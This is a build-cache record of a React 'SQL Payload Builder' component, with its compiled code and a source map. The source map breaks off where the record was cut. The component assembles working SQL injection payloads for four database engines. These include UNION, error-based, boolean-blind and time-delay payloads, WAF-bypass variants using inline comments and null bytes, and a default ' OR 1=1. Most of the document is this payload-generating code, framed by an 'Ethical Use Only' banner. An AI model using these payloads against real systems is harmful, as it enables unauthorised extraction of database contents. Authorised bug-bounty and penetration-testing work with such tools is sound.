{"ast":null,"code":"var _jsxFileName = \"/home/boss/BugBounty/BuggyBug/src/components/PayloadBuilder.js\",\n  _s = $RefreshSig$();\nimport React, { useState, useEffect } from 'react';\nimport { motion } from 'framer-motion';\nimport { useTheme } from '../contexts/ThemeContext';\nimport { FiCopy, FiRefreshCw, FiCode, FiDatabase } from 'react-icons/fi';\nimport { jsxDEV as _jsxDEV } from \"react/jsx-dev-runtime\";\nconst PayloadBuilder = () => {\n  _s();\n  const [injectionType, setInjectionType] = useState('union');\n  const [database, setDatabase] = useState('mysql');\n  const [context, setContext] = useState('string');\n  const [columns, setColumns] = useState('3');\n  const [table, setTable] = useState('users');\n  const [payload, setPayload] = useState('');\n  const [copied, setCopied] = useState(false);\n  const {\n    isDarkMode\n  } = useTheme();\n  const databases = {\n    mysql: {\n      name: 'MySQL',\n      comment: '-- ',\n      concat: 'CONCAT()',\n      version: 'VERSION()',\n      user: 'USER()'\n    },\n    postgresql: {\n      name: 'PostgreSQL',\n      comment: '-- ',\n      concat: '||',\n      version: 'VERSION()',\n      user: 'CURRENT_USER'\n    },\n    mssql: {\n      name: 'MS SQL Server',\n      comment: '-- ',\n      concat: '+',\n      version: '@@VERSION',\n      user: 'SYSTEM_USER'\n    },\n    oracle: {\n      name: 'Oracle',\n      comment: '-- ',\n      concat: '||',\n      version: 'BANNER',\n      user: 'USER'\n    }\n  };\n  const buildPayload = () => {\n    const db = databases[database];\n    let builtPayload = '';\n    switch (injectionType) {\n      case 'union':\n        const nulls = Array(parseInt(columns)).fill('NULL').join(',');\n        builtPayload = `' UNION SELECT ${nulls.replace('NULL', `'${table}'`).replace('NULL', 'COUNT(*)')} FROM ${table} ${db.comment}`;\n        break;\n      case 'error':\n        if (database === 'mysql') {\n          builtPayload = `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ${db.user}), 0x7e)) ${db.comment}`;\n        } else if (database === 'mssql') {\n          builtPayload = `' AND 1=CONVERT(int, (SELECT ${db.user})) ${db.comment}`;\n        } else {\n          builtPayload = `' AND 1=CAST((SELECT ${db.user}) AS int) ${db.comment}`;\n        }\n        break;\n      case 'boolean':\n        builtPayload = `' AND (SELECT LENGTH(${db.user}))>0 ${db.comment}`;\n        break;\n      case 'time':\n        if (database === 'mysql') {\n          builtPayload = `' AND IF((SELECT LENGTH(${db.user}))>0, SLEEP(5), 0) ${db.comment}`;\n        } else if (database === 'mssql') {\n          builtPayload = `' AND IF((SELECT LEN(${db.user}))>0) WAITFOR DELAY '00:00:05' ${db.comment}`;\n        } else {\n          builtPayload = `' AND CASE WHEN (SELECT LENGTH(${db.user}))>0 THEN pg_sleep(5) ELSE 0 END ${db.comment}`;\n        }\n        break;\n      case 'bypass':\n        const bypassTechniques = [`'/**/UNION/**/SELECT/**/`, `' UNION/*!50000SELECT*/`, `' UNI%00ON SELECT`, `' /*!UNION*/ /*!SELECT*/`];\n        builtPayload = bypassTechniques[Math.floor(Math.random() * bypassTechniques.length)] + ` NULL,${db.user},NULL ${db.comment}`;\n        break;\n      default:\n        builtPayload = `' OR 1=1 ${db.comment}`;\n    }\n\n    // Apply context escaping\n    if (context === 'numeric') {\n      builtPayload = builtPayload.replace(/^'/, '').replace(/\\s--\\s*$/, ' -- ');\n    } else if (context === 'double_quote') {\n      builtPayload = builtPayload.replace(/'/g, '\"');\n    }\n    setPayload(builtPayload);\n  };\n  useEffect(() => {\n    buildPayload();\n  }, [injectionType, database, context, columns, table]);\n  const handleCopy = () => {\n    navigator.clipboard.writeText(payload);\n    setCopied(true);\n    setTimeout(() => setCopied(false), 2000);\n  };\n  const generateRandomPayload = () => {\n    const types = ['union', 'error', 'boolean', 'time', 'bypass'];\n    const dbs = Object.keys(databases);\n    const contexts = ['string', 'numeric', 'double_quote'];\n    setInjectionType(types[Math.floor(Math.random() * types.length)]);\n    setDatabase(dbs[Math.floor(Math.random() * dbs.length)]);\n    setContext(contexts[Math.floor(Math.random() * contexts.length)]);\n    setColumns((Math.floor(Math.random() * 5) + 2).toString());\n  };\n  return /*#__PURE__*/_jsxDEV(motion.div, {\n    initial: {\n      opacity: 0,\n      y: 20\n    },\n    animate: {\n      opacity: 1,\n      y: 0\n    },\n    className: `mt-6 p-6 rounded-lg shadow-lg ${isDarkMode ? 'bg-gray-800 bg-opacity-50 border border-gray-700' : 'bg-white bg-opacity-80 border border-gray-200'}`,\n    children: [/*#__PURE__*/_jsxDEV(\"div\", {\n      className: \"flex items-center justify-between mb-4\",\n      children: [/*#__PURE__*/_jsxDEV(\"h3\", {\n        className: \"text-xl font-bold flex items-center\",\n        children: [/*#__PURE__*/_jsxDEV(FiCode, {\n          className: \"mr-2 text-orange-400\"\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 114,\n          columnNumber: 11\n        }, this), \"SQL Payload Builder\"]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 113,\n        columnNumber: 9\n      }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n        onClick: generateRandomPayload,\n        className: \"flex items-center px-3 py-2 text-sm bg-orange-600 hover:bg-orange-700 rounded-lg transition-colors\",\n        children: [/*#__PURE__*/_jsxDEV(FiRefreshCw, {\n          className: \"mr-1\"\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 121,\n          columnNumber: 11\n        }, this), \"Random\"]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 117,\n        columnNumber: 9\n      }, this)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 112,\n      columnNumber: 7\n    }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n      className: \"grid md:grid-cols-2 gap-6\",\n      children: [/*#__PURE__*/_jsxDEV(\"div\", {\n        className: \"space-y-4\",\n        children: [/*#__PURE__*/_jsxDEV(\"div\", {\n          children: [/*#__PURE__*/_jsxDEV(\"label\", {\n            className: \"block text-sm font-medium mb-2\",\n            children: \"Injection Type\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 130,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(\"select\", {\n            value: injectionType,\n            onChange: e => setInjectionType(e.target.value),\n            className: `w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`,\n            children: [/*#__PURE__*/_jsxDEV(\"option\", {\n              value: \"union\",\n              children: \"UNION-Based\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 136,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"option\", {\n              value: \"error\",\n              children: \"Error-Based\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 137,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"option\", {\n              value: \"boolean\",\n              children: \"Boolean Blind\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 138,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"option\", {\n              value: \"time\",\n              children: \"Time-Based\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 139,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"option\", {\n              value: \"bypass\",\n              children: \"WAF Bypass\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 140,\n              columnNumber: 15\n            }, this)]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 131,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 129,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          children: [/*#__PURE__*/_jsxDEV(\"label\", {\n            className: \"block text-sm font-medium mb-2\",\n            children: \"Database Type\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 145,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(\"select\", {\n            value: database,\n            onChange: e => setDatabase(e.target.value),\n            className: `w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`,\n            children: Object.entries(databases).map(([key, db]) => /*#__PURE__*/_jsxDEV(\"option\", {\n              value: key,\n              children: db.name\n            }, key, false, {\n              fileName: _jsxFileName,\n              lineNumber: 152,\n              columnNumber: 17\n            }, this))\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 146,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 144,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          children: [/*#__PURE__*/_jsxDEV(\"label\", {\n            className: \"block text-sm font-medium mb-2\",\n            children: \"Injection Context\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 158,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(\"select\", {\n            value: context,\n            onChange: e => setContext(e.target.value),\n            className: `w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`,\n            children: [/*#__PURE__*/_jsxDEV(\"option\", {\n              value: \"string\",\n              children: \"String Context (')\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 164,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"option\", {\n              value: \"numeric\",\n              children: \"Numeric Context\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 165,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"option\", {\n              value: \"double_quote\",\n              children: \"Double Quote (\\\")\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 166,\n              columnNumber: 15\n            }, this)]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 159,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 157,\n          columnNumber: 11\n        }, this), injectionType === 'union' && /*#__PURE__*/_jsxDEV(\"div\", {\n          children: [/*#__PURE__*/_jsxDEV(\"label\", {\n            className: \"block text-sm font-medium mb-2\",\n            children: \"Number of Columns\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 172,\n            columnNumber: 15\n          }, this), /*#__PURE__*/_jsxDEV(\"input\", {\n            type: \"number\",\n            min: \"1\",\n            max: \"10\",\n            value: columns,\n            onChange: e => setColumns(e.target.value),\n            className: `w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 173,\n            columnNumber: 15\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 171,\n          columnNumber: 13\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          children: [/*#__PURE__*/_jsxDEV(\"label\", {\n            className: \"block text-sm font-medium mb-2\",\n            children: \"Target Table\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 185,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(\"input\", {\n            type: \"text\",\n            value: table,\n            onChange: e => setTable(e.target.value),\n            className: `w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`,\n            placeholder: \"e.g., users, admin, accounts\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 186,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 184,\n          columnNumber: 11\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 128,\n        columnNumber: 9\n      }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n        children: [/*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"flex items-center justify-between mb-2\",\n          children: [/*#__PURE__*/_jsxDEV(\"label\", {\n            className: \"block text-sm font-medium\",\n            children: \"Generated Payload\"\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 199,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(\"button\", {\n            onClick: handleCopy,\n            className: \"flex items-center px-3 py-1 text-xs bg-blue-600 hover:bg-blue-700 rounded transition-colors\",\n            children: [/*#__PURE__*/_jsxDEV(FiCopy, {\n              className: \"mr-1\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 204,\n              columnNumber: 15\n            }, this), copied ? 'Copied!' : 'Copy']\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 200,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 198,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: `p-4 rounded-lg border-2 border-dashed ${isDarkMode ? 'bg-gray-900 border-gray-600' : 'bg-gray-50 border-gray-300'}`,\n          children: /*#__PURE__*/_jsxDEV(\"code\", {\n            className: \"text-sm break-all font-mono text-orange-400\",\n            children: payload || 'Configure options to generate payload...'\n          }, void 0, false, {\n            fileName: _jsxFileName,\n            lineNumber: 212,\n            columnNumber: 13\n          }, this)\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 209,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"mt-4 space-y-2\",\n          children: [/*#__PURE__*/_jsxDEV(\"div\", {\n            className: \"flex items-center text-sm\",\n            children: [/*#__PURE__*/_jsxDEV(FiDatabase, {\n              className: \"mr-2 text-teal-400\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 219,\n              columnNumber: 15\n            }, this), /*#__PURE__*/_jsxDEV(\"span\", {\n              children: [\"Database: \", /*#__PURE__*/_jsxDEV(\"strong\", {\n                children: databases[database].name\n              }, void 0, false, {\n                fileName: _jsxFileName,\n                lineNumber: 220,\n                columnNumber: 31\n              }, this)]\n            }, void 0, true, {\n              fileName: _jsxFileName,\n              lineNumber: 220,\n              columnNumber: 15\n            }, this)]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 218,\n            columnNumber: 13\n          }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n            className: \"text-xs text-gray-400\",\n            children: [/*#__PURE__*/_jsxDEV(\"strong\", {\n              children: \"Explanation:\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 223,\n              columnNumber: 15\n            }, this), injectionType === 'union' && ' Uses UNION SELECT to extract data from multiple tables.', injectionType === 'error' && ' Triggers database errors to leak sensitive information.', injectionType === 'boolean' && ' Uses boolean conditions to infer data character by character.', injectionType === 'time' && ' Uses time delays to confirm injection and extract data.', injectionType === 'bypass' && ' Uses various techniques to bypass Web Application Firewalls.']\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 222,\n            columnNumber: 13\n          }, this)]\n        }, void 0, true, {\n          fileName: _jsxFileName,\n          lineNumber: 217,\n          columnNumber: 11\n        }, this), /*#__PURE__*/_jsxDEV(\"div\", {\n          className: \"mt-4 p-3 bg-yellow-900/20 border border-yellow-700/50 rounded-lg\",\n          children: /*#__PURE__*/_jsxDEV(\"p\", {\n            className: \"text-xs text-yellow-300\",\n            children: [\"\\u26A0\\uFE0F \", /*#__PURE__*/_jsxDEV(\"strong\", {\n              children: \"Ethical Use Only:\"\n            }, void 0, false, {\n              fileName: _jsxFileName,\n              lineNumber: 234,\n              columnNumber: 18\n            }, this), \" These payloads are for educational purposes and authorized security testing only.\"]\n          }, void 0, true, {\n            fileName: _jsxFileName,\n            lineNumber: 233,\n            columnNumber: 13\n          }, this)\n        }, void 0, false, {\n          fileName: _jsxFileName,\n          lineNumber: 232,\n          columnNumber: 11\n        }, this)]\n      }, void 0, true, {\n        fileName: _jsxFileName,\n        lineNumber: 197,\n        columnNumber: 9\n      }, this)]\n    }, void 0, true, {\n      fileName: _jsxFileName,\n      lineNumber: 126,\n      columnNumber: 7\n    }, this)]\n  }, void 0, true, {\n    fileName: _jsxFileName,\n    lineNumber: 103,\n    columnNumber: 5\n  }, this);\n};\n_s(PayloadBuilder, \"/qgoFKJ+EkpyGdYKpW64HlwR7GU=\", false, function () {\n  return [useTheme];\n});\n_c = PayloadBuilder;\nexport default PayloadBuilder;\nvar _c;\n$RefreshReg$(_c, \"PayloadBuilder\");","map":{"version":3,"names":["React","useState","useEffect","motion","useTheme","FiCopy","FiRefreshCw","FiCode","FiDatabase","jsxDEV","_jsxDEV","PayloadBuilder","_s","injectionType","setInjectionType","database","setDatabase","context","setContext","columns","setColumns","table","setTable","payload","setPayload","copied","setCopied","isDarkMode","databases","mysql","name","comment","concat","version","user","postgresql","mssql","oracle","buildPayload","db","builtPayload","nulls","Array","parseInt","fill","join","replace","bypassTechniques","Math","floor","random","length","handleCopy","navigator","clipboard","writeText","setTimeout","generateRandomPayload","types","dbs","Object","keys","contexts","toString","div","initial","opacity","y","animate","className","children","fileName","_jsxFileName","lineNumber","columnNumber","onClick","value","onChange","e","target","entries","map","key","type","min","max","placeholder","_c","$RefreshReg$"],"sources":["/home/boss/BugBounty/BuggyBug/src/components/PayloadBuilder.js"],"sourcesContent":["import React, { useState, useEffect } from 'react';\nimport { motion } from 'framer-motion';\nimport { useTheme } from '../contexts/ThemeContext';\nimport { FiCopy, FiRefreshCw, FiCode, FiDatabase } from 'react-icons/fi';\n\nconst PayloadBuilder = () => {\n  const [injectionType, setInjectionType] = useState('union');\n  const [database, setDatabase] = useState('mysql');\n  const [context, setContext] = useState('string');\n  const [columns, setColumns] = useState('3');\n  const [table, setTable] = useState('users');\n  const [payload, setPayload] = useState('');\n  const [copied, setCopied] = useState(false);\n  const { isDarkMode } = useTheme();\n\n  const databases = {\n    mysql: { name: 'MySQL', comment: '-- ', concat: 'CONCAT()', version: 'VERSION()', user: 'USER()' },\n    postgresql: { name: 'PostgreSQL', comment: '-- ', concat: '||', version: 'VERSION()', user: 'CURRENT_USER' },\n    mssql: { name: 'MS SQL Server', comment: '-- ', concat: '+', version: '@@VERSION', user: 'SYSTEM_USER' },\n    oracle: { name: 'Oracle', comment: '-- ', concat: '||', version: 'BANNER', user: 'USER' }\n  };\n\n  const buildPayload = () => {\n    const db = databases[database];\n    let builtPayload = '';\n\n    switch (injectionType) {\n      case 'union':\n        const nulls = Array(parseInt(columns)).fill('NULL').join(',');\n        builtPayload = `' UNION SELECT ${nulls.replace('NULL', `'${table}'`).replace('NULL', 'COUNT(*)')} FROM ${table} ${db.comment}`;\n        break;\n      \n      case 'error':\n        if (database === 'mysql') {\n          builtPayload = `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ${db.user}), 0x7e)) ${db.comment}`;\n        } else if (database === 'mssql') {\n          builtPayload = `' AND 1=CONVERT(int, (SELECT ${db.user})) ${db.comment}`;\n        } else {\n          builtPayload = `' AND 1=CAST((SELECT ${db.user}) AS int) ${db.comment}`;\n        }\n        break;\n      \n      case 'boolean':\n        builtPayload = `' AND (SELECT LENGTH(${db.user}))>0 ${db.comment}`;\n        break;\n      \n      case 'time':\n        if (database === 'mysql') {\n          builtPayload = `' AND IF((SELECT LENGTH(${db.user}))>0, SLEEP(5), 0) ${db.comment}`;\n        } else if (database === 'mssql') {\n          builtPayload = `' AND IF((SELECT LEN(${db.user}))>0) WAITFOR DELAY '00:00:05' ${db.comment}`;\n        } else {\n          builtPayload = `' AND CASE WHEN (SELECT LENGTH(${db.user}))>0 THEN pg_sleep(5) ELSE 0 END ${db.comment}`;\n        }\n        break;\n      \n      case 'bypass':\n        const bypassTechniques = [\n          `'/**/UNION/**/SELECT/**/`,\n          `' UNION/*!50000SELECT*/`,\n          `' UNI%00ON SELECT`,\n          `' /*!UNION*/ /*!SELECT*/`\n        ];\n        builtPayload = bypassTechniques[Math.floor(Math.random() * bypassTechniques.length)] + ` NULL,${db.user},NULL ${db.comment}`;\n        break;\n      \n      default:\n        builtPayload = `' OR 1=1 ${db.comment}`;\n    }\n\n    // Apply context escaping\n    if (context === 'numeric') {\n      builtPayload = builtPayload.replace(/^'/, '').replace(/\\s--\\s*$/, ' -- ');\n    } else if (context === 'double_quote') {\n      builtPayload = builtPayload.replace(/'/g, '\"');\n    }\n\n    setPayload(builtPayload);\n  };\n\n  useEffect(() => {\n    buildPayload();\n  }, [injectionType, database, context, columns, table]);\n\n  const handleCopy = () => {\n    navigator.clipboard.writeText(payload);\n    setCopied(true);\n    setTimeout(() => setCopied(false), 2000);\n  };\n\n  const generateRandomPayload = () => {\n    const types = ['union', 'error', 'boolean', 'time', 'bypass'];\n    const dbs = Object.keys(databases);\n    const contexts = ['string', 'numeric', 'double_quote'];\n    \n    setInjectionType(types[Math.floor(Math.random() * types.length)]);\n    setDatabase(dbs[Math.floor(Math.random() * dbs.length)]);\n    setContext(contexts[Math.floor(Math.random() * contexts.length)]);\n    setColumns((Math.floor(Math.random() * 5) + 2).toString());\n  };\n\n  return (\n    <motion.div\n      initial={{ opacity: 0, y: 20 }}\n      animate={{ opacity: 1, y: 0 }}\n      className={`mt-6 p-6 rounded-lg shadow-lg ${\n        isDarkMode \n          ? 'bg-gray-800 bg-opacity-50 border border-gray-700' \n          : 'bg-white bg-opacity-80 border border-gray-200'\n      }`}\n    >\n      <div className=\"flex items-center justify-between mb-4\">\n        <h3 className=\"text-xl font-bold flex items-center\">\n          <FiCode className=\"mr-2 text-orange-400\" />\n          SQL Payload Builder\n        </h3>\n        <button\n          onClick={generateRandomPayload}\n          className=\"flex items-center px-3 py-2 text-sm bg-orange-600 hover:bg-orange-700 rounded-lg transition-colors\"\n        >\n          <FiRefreshCw className=\"mr-1\" />\n          Random\n        </button>\n      </div>\n\n      <div className=\"grid md:grid-cols-2 gap-6\">\n        {/* Configuration Panel */}\n        <div className=\"space-y-4\">\n          <div>\n            <label className=\"block text-sm font-medium mb-2\">Injection Type</label>\n            <select\n              value={injectionType}\n              onChange={(e) => setInjectionType(e.target.value)}\n              className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}\n            >\n              <option value=\"union\">UNION-Based</option>\n              <option value=\"error\">Error-Based</option>\n              <option value=\"boolean\">Boolean Blind</option>\n              <option value=\"time\">Time-Based</option>\n              <option value=\"bypass\">WAF Bypass</option>\n            </select>\n          </div>\n\n          <div>\n            <label className=\"block text-sm font-medium mb-2\">Database Type</label>\n            <select\n              value={database}\n              onChange={(e) => setDatabase(e.target.value)}\n              className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}\n            >\n              {Object.entries(databases).map(([key, db]) => (\n                <option key={key} value={key}>{db.name}</option>\n              ))}\n            </select>\n          </div>\n\n          <div>\n            <label className=\"block text-sm font-medium mb-2\">Injection Context</label>\n            <select\n              value={context}\n              onChange={(e) => setContext(e.target.value)}\n              className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}\n            >\n              <option value=\"string\">String Context (')</option>\n              <option value=\"numeric\">Numeric Context</option>\n              <option value=\"double_quote\">Double Quote (\")</option>\n            </select>\n          </div>\n\n          {injectionType === 'union' && (\n            <div>\n              <label className=\"block text-sm font-medium mb-2\">Number of Columns</label>\n              <input\n                type=\"number\"\n                min=\"1\"\n                max=\"10\"\n                value={columns}\n                onChange={(e) => setColumns(e.target.value)}\n                className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}\n              />\n            </div>\n          )}\n\n          <div>\n            <label className=\"block text-sm font-medium mb-2\">Target Table</label>\n            <input\n              type=\"text\"\n              value={table}\n              onChange={(e) => setTable(e.target.value)}\n              className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}\n              placeholder=\"e.g., users, admin, accounts\"\n            />\n          </div>\n        </div>\n\n        {/* Generated Payload Panel */}\n        <div>\n          <div className=\"flex items-center justify-between mb-2\">\n            <label className=\"block text-sm font-medium\">Generated Payload</label>\n            <button\n              onClick={handleCopy}\n              className=\"flex items-center px-3 py-1 text-xs bg-blue-600 hover:bg-blue-700 rounded transition-colors\"\n            >\n              <FiCopy className=\"mr-1\" />\n              {copied ? 'Copied!' : 'Copy'}\n            </button>\n          </div>\n          \n          <div className={`p-4 rounded-lg border-2 border-dashed ${\n            isDarkMode ? 'bg-gray-900 border-gray-600' : 'bg-gray-50 border-gray-300'\n          }`}>\n            <code className=\"text-sm break-all font-mono text-orange-400\">\n              {payload || 'Configure options to generate payload...'}\n            </code>\n          </div>\n\n          <div className=\"mt-4 space-y-2\">\n            <div className=\"flex items-center text-sm\">\n              <FiDatabase className=\"mr-2 text-teal-400\" />\n              <span>Database: <strong>{databases[database].name}</strong></span>\n            </div>\n            <div className=\"text-xs text-gray-400\">\n              <strong>Explanation:</strong> \n              {injectionType === 'union' && ' Uses UNION SELECT to extract data from multiple tables.'}\n              {injectionType === 'error' && ' Triggers database errors to leak sensitive information.'}\n              {injectionType === 'boolean' && ' Uses boolean conditions to infer data character by character.'}\n              {injectionType === 'time' && ' Uses time delays to confirm injection and extract data.'}\n              {injectionType === 'bypass' && ' Uses various techniques to bypass Web Application Firewalls.'}\n            </div>\n          </div>\n\n          <div className=\"mt-4 p-3 bg-yellow-900/20 border border-yellow-700/50 rounded-lg\">\n            <p className=\"text-xs text-yellow-300\">\n              ⚠️ <strong>Ethical Use Only:</strong> These payloads are for educational purposes and authorized security testing only.\n            </p>\n          </div>\n        </div>\n      </div>\n    </motion.div>\n  );\n};\n\nexport default PayloadBuilder;\n"],"mappings":";;AAAA,OAAOA,KAAK,IAAIC,QAAQ,EAAEC,SAAS,QAAQ,OAAO;AAClD,SAASC,MAAM,QAAQ,eAAe;AACtC,SAASC,QAAQ,QAAQ,0BAA0B;AACnD,SAASC,MAAM,EAAEC,WAAW,EAAEC,MAAM,EAAEC,UAAU,QAAQ,gBAAgB;AAAC,SAAAC,MAAA,IAAAC,OAAA;AAEzE,MAAMC,cAAc,GAAGA,CAAA,KAAM;EAAAC,EAAA;EAC3B,MAAM,CAACC,aAAa,EAAEC,gBAAgB,CAAC,GAAGb,QAAQ,CAAC,OAAO,CAAC;EAC3D,MAAM,CAACc,QAAQ,EAAEC,WAAW,CAAC,GAAGf,QAAQ,CAAC,OAAO,CAAC;EACjD,MAAM,CAACgB,OAAO,EAAEC,UAAU,CAAC,GAAGjB,QAAQ,CAAC,QAAQ,CAAC;EAChD,MAAM,CAACkB,OAAO,EAAEC,UAAU,CAAC,GAAGnB,QAAQ,CAAC,GAAG,CAAC;EAC3C,MAAM,CAACoB,KAAK,EAAEC,QAAQ,CAAC,GAAGrB,QAAQ,CAAC,OAAO,CAAC;EAC3C,MAAM,CAACsB,OAAO,EAAEC,UAAU,CAAC,GAAGvB,QAAQ,CAAC,EAAE,CAAC;EAC1C,MAAM,CAACwB,MAAM,EAAEC,SAAS,CAAC,GAAGzB,QAAQ,CAAC,KAAK,CAAC;EAC3C,MAAM;IAAE0B;EAAW,CAAC,GAAGvB,QAAQ,CAAC,CAAC;EAEjC,MAAMwB,SAAS,GAAG;IAChBC,KAAK,EAAE;MAAEC,IAAI,EAAE,OAAO;MAAEC,OAAO,EAAE,KAAK;MAAEC,MAAM,EAAE,UAAU;MAAEC,OAAO,EAAE,WAAW;MAAEC,IAAI,EAAE;IAAS,CAAC;IAClGC,UAAU,EAAE;MAAEL,IAAI,EAAE,YAAY;MAAEC,OAAO,EAAE,KAAK;MAAEC,MAAM,EAAE,IAAI;MAAEC,OAAO,EAAE,WAAW;MAAEC,IAAI,EAAE;IAAe,CAAC;IAC5GE,KAAK,EAAE;MAAEN,IAAI,EAAE,eAAe;MAAEC,OAAO,EAAE,KAAK;MAAEC,MAAM,EAAE,GAAG;MAAEC,OAAO,EAAE,WAAW;MAAEC,IAAI,EAAE;IAAc,CAAC;IACxGG,MAAM,EAAE;MAAEP,IAAI,EAAE,QAAQ;MAAEC,OAAO,EAAE,KAAK;MAAEC,MAAM,EAAE,IAAI;MAAEC,OAAO,EAAE,QAAQ;MAAEC,IAAI,EAAE;IAAO;EAC1F,CAAC;EAED,MAAMI,YAAY,GAAGA,CAAA,KAAM;IACzB,MAAMC,EAAE,GAAGX,SAAS,CAACb,QAAQ,CAAC;IAC9B,IAAIyB,YAAY,GAAG,EAAE;IAErB,QAAQ3B,aAAa;MACnB,KAAK,OAAO;QACV,MAAM4B,KAAK,GAAGC,KAAK,CAACC,QAAQ,CAACxB,OAAO,CAAC,CAAC,CAACyB,IAAI,CAAC,MAAM,CAAC,CAACC,IAAI,CAAC,GAAG,CAAC;QAC7DL,YAAY,GAAG,kBAAkBC,KAAK,CAACK,OAAO,CAAC,MAAM,EAAE,IAAIzB,KAAK,GAAG,CAAC,CAACyB,OAAO,CAAC,MAAM,EAAE,UAAU,CAAC,SAASzB,KAAK,IAAIkB,EAAE,CAACR,OAAO,EAAE;QAC9H;MAEF,KAAK,OAAO;QACV,IAAIhB,QAAQ,KAAK,OAAO,EAAE;UACxByB,YAAY,GAAG,8CAA8CD,EAAE,CAACL,IAAI,aAAaK,EAAE,CAACR,OAAO,EAAE;QAC/F,CAAC,MAAM,IAAIhB,QAAQ,KAAK,OAAO,EAAE;UAC/ByB,YAAY,GAAG,gCAAgCD,EAAE,CAACL,IAAI,MAAMK,EAAE,CAACR,OAAO,EAAE;QAC1E,CAAC,MAAM;UACLS,YAAY,GAAG,wBAAwBD,EAAE,CAACL,IAAI,aAAaK,EAAE,CAACR,OAAO,EAAE;QACzE;QACA;MAEF,KAAK,SAAS;QACZS,YAAY,GAAG,wBAAwBD,EAAE,CAACL,IAAI,QAAQK,EAAE,CAACR,OAAO,EAAE;QAClE;MAEF,KAAK,MAAM;QACT,IAAIhB,QAAQ,KAAK,OAAO,EAAE;UACxByB,YAAY,GAAG,2B